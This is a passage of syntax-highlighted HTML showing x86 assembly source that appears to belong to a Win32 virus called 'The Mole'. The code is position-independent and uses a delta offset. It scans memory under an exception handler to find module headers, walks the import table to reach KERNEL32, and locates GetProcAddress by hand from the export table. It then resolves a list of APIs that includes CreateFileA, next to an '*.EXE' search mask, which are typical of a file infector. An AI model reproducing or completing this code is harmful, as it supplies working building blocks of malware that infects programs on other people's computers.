</span><span class="sc5">Limit</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">BASE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">AddFunc</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">Limit</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">AddName</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">AddFunc</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">AddOrd</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">AddName</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0"> 
</span><span class="sc5">Nindex</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">AddOrd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">WorkSp</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">Nindex</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">GetPAdd</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">WorkSp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">RetAdd</span><span class="sc0">          </span><span class="sc9">Equ</span><span class="sc0">     </span><span class="sc5">GetPAdd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
 

</span><span class="sc5">EdataLoc</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">78h</span><span class="sc0">
</span><span class="sc5">IdataLoc</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

</span><span class="sc5">GetAddie</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">here</span><span class="sc0">
</span><span class="sc5">here</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetPE</span><span class="sc0">    </span><span class="sc1">;eax,esi               </span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">GetAddie_fini</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;Address of PE header for this module</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">    </span><span class="sc1">;Load address of Module</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetK32API</span><span class="sc0">
        </span><span class="sc1">;On return Esi = a API call in Kernel32</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetPE</span><span class="sc0">   </span><span class="sc1">;eax,esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">      </span><span class="sc1">;Module address of K32</span><span class="sc0">

        </span><span class="sc1">;esi = to the load address Kernel32</span><span class="sc0">
        </span><span class="sc1">;eax = address to the PE header of Kernel32</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;hold the return info</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetGetProcessAdd</span><span class="sc0">
 
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
          
</span><span class="sc5">GetAddie_fini</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">
 
</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GetGetProcessAdd</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;esi = to the load address Kernel32</span><span class="sc0">
</span><span class="sc1">;eax = address to the PE header of Kernel32</span><span class="sc0">
</span><span class="sc1">;on return</span><span class="sc0">
</span><span class="sc1">;on the stack is the Address</span><span class="sc0">
         
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">WorkSp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">Pusha</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
 

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">K32</span><span class="sc4">],</span><span class="sc8">Esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EdataLoc</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;gets us the Edata offset</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;pointer to  base</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BASE</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc1">;mov     [ebp + BASE],eax        ;save base</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;total number of exported functions</span><span class="sc0">
                                        </span><span class="sc1">;by name and ordinal</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;the functions exported by name</span><span class="sc0">
        </span><span class="sc1">;mov     [ebp +Limit],eax        ;this is how far its safe to look</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">


        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">;mov     [ebp + AddFunc],eax</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">
 
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc1">;mov     [ebp + AddName],eax</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0"> 

        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">  
        </span><span class="sc1">;mov     [ebp + AddOrd],eax</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">


</span><span class="sc5">LookLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">Nindex</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;get the load Add of K32</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">TryAgain</span><span class="sc4">:</span><span class="sc0">
         
        </span><span class="sc1">;find GetProcAddress</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'PteG'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NextOne</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'Acor'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NextOne</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc12">'erdd'</span><span class="sc0"> 
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NextOne</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc12">'ss'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NextOne</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NextOne</span><span class="sc0">

       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GotGetProcAdd</span><span class="sc0">

</span><span class="sc5">NextOne</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Limit</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jge</span><span class="sc0">     </span><span class="sc5">NotFound1</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Nindex</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">Nindex</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">TryAgain</span><span class="sc0">



</span><span class="sc5">GotGetProcAdd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;ok we have the index into the name array use this to get</span><span class="sc0">
        </span><span class="sc1">; the index into the ord array</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;*2 for a word array</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddOrd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;move to the correct spot in the array        </span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc1">;ax = ordinal value</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;*4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddFunc</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;got the address of it</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetPAdd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OkFound</span><span class="sc0">

</span><span class="sc5">NotFound1</span><span class="sc4">:</span><span class="sc0">
 
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">OkFound</span><span class="sc4">:</span><span class="sc0">

  
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">WorkSp</span><span class="sc0">
 

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;ok at this point we have</span><span class="sc0">
</span><span class="sc1">;esi = to the load address of the program</span><span class="sc0">
</span><span class="sc1">;eax = address to the PE header now using this get the .idata area</span><span class="sc0">
</span><span class="sc1">;rather than use the .IDATA section we look for the more dependable</span><span class="sc0">
</span><span class="sc1">;idata entry in the idatrva section which is offset 80h into the PE header</span><span class="sc0">


</span><span class="sc5">GetK32API</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0"> 
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">IdataLoc</span><span class="sc4">]</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0"> 

        </span><span class="sc1">;Ebx now points to the import data table</span><span class="sc0">

</span><span class="sc5">NextDll</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">       </span><span class="sc5">NoIdataLeft</span><span class="sc0">
 
       </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'NREK'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">NotFound</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'23LE'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">NotFound</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;next line is needed only in debug td32</span><span class="sc0">
</span><span class="sc1">;only in win95 not Winnt 4.0 at least so far</span><span class="sc0">
</span><span class="sc1">;       mov      eax,[eax+1]</span><span class="sc0">

 
       </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NoIdataLeft</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NotFound</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">NextDll</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
 
</span><span class="sc1">;Routine that will , given the address within a .exe in memory</span><span class="sc0">
</span><span class="sc1">;track back and find the MZ header then using this info one can</span><span class="sc0">
</span><span class="sc1">;find the Kernel32 (as long as the exe imports a kernel32 function</span><span class="sc0">
</span><span class="sc1">; on input</span><span class="sc0">
</span><span class="sc1">;esi = the address to start looking at</span><span class="sc0">
</span><span class="sc1">;on exit</span><span class="sc0">
</span><span class="sc1">;esi = the address of the MZ header</span><span class="sc0">
</span><span class="sc1">;eax = the address of the PE header</span><span class="sc0">

</span><span class="sc5">GetPE</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">SetupSEH</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindExcept</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc5">LoopFind</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0FFFFF000h</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Found</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">LoopFind</span><span class="sc0">

</span><span class="sc5">FindExcept</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Some Exception occured assume "DEAD" area, reset and continue</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                            </span><span class="sc1">;restores our "REGS" esi mainly </span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;restore old handler</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">;remove last bit of hanlder</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">               </span><span class="sc1">;Get set for next page to look at</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SetupSEH</span><span class="sc0">

</span><span class="sc5">Found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">            </span><span class="sc1">;esi = out MZ header</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">Lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0"> 

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GetFunctions</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">Mov</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc4">]</span><span class="sc0"> 
               </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Funct_List</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Mole</span><span class="sc0">

               </span><span class="sc6">Lea</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CFile</span><span class="sc4">]</span><span class="sc0">

               </span><span class="sc1">;mov      ecx,9           ;*</span><span class="sc0">
               </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">

</span><span class="sc5">startGetLoop</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

               </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc0">                     </span><span class="sc1">;function name               </span><span class="sc0">
               </span><span class="sc6">Push</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">K32Load</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;dll</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetProc</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">stosd</span><span class="sc0">

               </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">

               </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">         </span><span class="sc1">;get next name</span><span class="sc0">
                
               </span><span class="sc6">Loop</span><span class="sc0">     </span><span class="sc5">startGetLoop</span><span class="sc0">

               </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;Data for The Mole</span><span class="sc0">
        
</span><span class="sc5">Funct_List</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;12</span><span class="sc0">
</span><span class="sc5">Fmask</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*.EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;5</span><span class="sc0">
